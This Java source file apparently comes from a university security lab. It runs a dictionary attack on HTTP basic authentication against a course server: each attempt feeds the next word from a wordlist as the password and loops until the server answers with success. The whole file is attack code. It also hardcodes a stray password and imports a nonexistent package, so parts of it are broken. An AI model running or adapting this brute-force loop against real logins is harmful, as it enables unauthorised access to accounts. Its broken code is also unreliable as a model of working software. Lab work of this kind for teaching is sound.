	


import java.io.*;
import java.net.*;

import java.util.*;

import java.misc.BASE64Encoder;

public class Dictionary {

  private String userId;
  private String password;

	ReadDictionary myWords = new ReadDictionary();

  public Dictionary() {

	
	myWords.openFile();

    
    Authenticator.setDefault (new MyAuthenticator());
	
	
  }

  public String fetchURL (String urlString) {


	StringBuffer sb = new StringBuffer();
	HttpURLConnection connection;
	Date startTime, endTime;
	int responseCode = -1;
	boolean retry = true;	
	
    URL url;
	startTime = new Date();
	
    System.out.println (" time :" + startTime);

	while (retry == true)
	{
	
	    try {

			url = new URL (urlString);

			connection = (HttpURLConnection)url.openConnection();

			setUserId("");
			setPassword("rhk8611");

			System.out.println("Attempting  get a response : " +connection.getURL() );
			responseCode = connection.getResponseCode();
			System.out.print(responseCode + " ");

			if (responseCode == HttpURLConnection.HTTP_OK) 
			{
				retry = false;
				System.out.println("**** ACCESS GRANTED *****");
			} else
			{
				retry = true;
				throw new IOException(
					"HTTP response : " + String.valueOf(responseCode) + 
					"\nResponse Message: " +connection.getResponseMessage() );
			}

			InputStream content = (InputStream)url.getContent();
			BufferedReader in   = 
			new BufferedReader (new InputStreamReader (content));
			String line;
				while ((line = in.readLine()) != null) {
					sb.append (line);
				}
			} catch (MalformedURLException e) {
				
				retry=false;
				System.out.println ("Invalid URL" + e.getMessage());
			} catch (IOException e) {
				
				retry=true;
				connection = null;
				System.out.println ("Error  URL \n" + e.getMessage());
			}
		}	
		endTime = new Date();
		System.out.println ("Total time taken (Sec) :" + (endTime.getTime() - startTime.getTime())/1000);
		
		
	return sb.toString();
  }


  public static void main (String args[]) {
	Dictionary myGenerator = new Dictionary();
	
String pageFound = myGenerator.fetchURL("http://sec-crack.cs.rmit.edu./SEC/2/");
		
	System.out.println(" ACCESSED ->\n" + pageFound);
  }

  class MyAuthenticator extends Authenticator {
    protected PasswordAuthentication getPasswordAuthentication()
	{
		String username = getUserId();
		String pass = myWords.readLine();	

	  System.out.println(" Authenticating with -> " + pass);

	  return new PasswordAuthentication (username, pass.toCharArray());
	  
    }
  }
	
	public String getPassword()
	{
		return this.password;
	}

	public void setPassword(String password)
	{
		this.password = password;
	}

	
	public String getUserId()
	{
		return this.userId;
	}

	public void setUserId(String userId)
	{
		this.userId = userId;
	}




}  


